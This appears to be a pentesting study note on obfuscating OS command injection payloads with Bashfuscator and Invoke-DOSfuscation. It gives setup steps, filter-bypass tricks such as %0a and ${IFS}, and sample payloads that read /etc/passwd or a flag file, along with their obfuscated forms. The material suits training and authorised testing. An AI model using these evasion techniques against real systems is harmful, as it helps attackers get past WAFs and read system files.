
# OS Command Injection - Obfuscation Tools

## 🧠 Overview
When manual bypass techniques (like quotes or `$IFS`) fail against advanced WAFs or complex regex filters, we turn to automated obfuscation. These tools transform valid commands into highly complex, randomized variants that maintain the original logic while evading static pattern detection.

---

## 🐧 Linux - Bashfuscator
Bashfuscator is the industry standard for creating complex, randomized obfuscated Bash payloads.

### 🔧 Setup
```bash
git clone [https://github.com/Bashfuscator/Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

### 🚀 Practical Usage
Generate a randomized payload that hides your command:
```bash
cd bashfuscator/bin/
./bashfuscator -c 'cat /etc/passwd'
```

### ⚡ Optimization Tip
If the generated payload is too large or complex for the target environment, use flags to simplify the output:
```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

---

## 🪟 Windows - DOSfuscation
DOSfuscation is a powerful framework for obfuscating CMD/Batch commands, leveraging environment variable manipulation and internal CMD logic.

### 🔧 Setup
```powershell
git clone [https://github.com/danielbohannon/Invoke-DOSfuscation.git](https://github.com/danielbohannon/Invoke-DOSfuscation.git)
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

### 🚀 Practical Usage
Inside the tool, simply set your command and apply encoding:
```cmd
SET COMMAND type C:\Users\target\Desktop\flag.txt
encoding
1
```

### ▶️ Real-World Example (Bypass)
The obfuscated result might look like this:
`typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt`
*The shell interprets this as `type C:\Users\...\flag.txt` dynamically.*

---

## 🧠 Pentester Mindset
* **The "Black Box" Principle:** Obfuscation is a tool of last resort. Always attempt manual bypass first (it’s stealthier and less likely to break the shell).
* **Environment Sensitivity:** Highly obfuscated payloads are fragile. If you inject a payload and it fails, it doesn't always mean your vulnerability is patched; it might mean the payload broke during shell interpretation.
* **Test Incrementally:** If you have an obfuscated payload, try to execute a simple `echo 1` with the same obfuscation layer first to verify if the shell can handle the complexity.

---

## ⚠️ Workflow Warning
1. **Verify the vulnerability manually** (e.g., `ping 127.0.0.1`).
2. **Use bypass tricks** (`%0a`, `${IFS}`).
3. **Deploy obfuscation tools** only when you hit a hard WAF or regex filter.
4. **Debug** by simplifying if the payload doesn't execute.

---

## 📚 References
- [Bashfuscator GitHub](https://github.com/Bashfuscator/Bashfuscator)
- [Invoke-DOSfuscation GitHub](https://github.com/danielbohannon/Invoke-DOSfuscation)
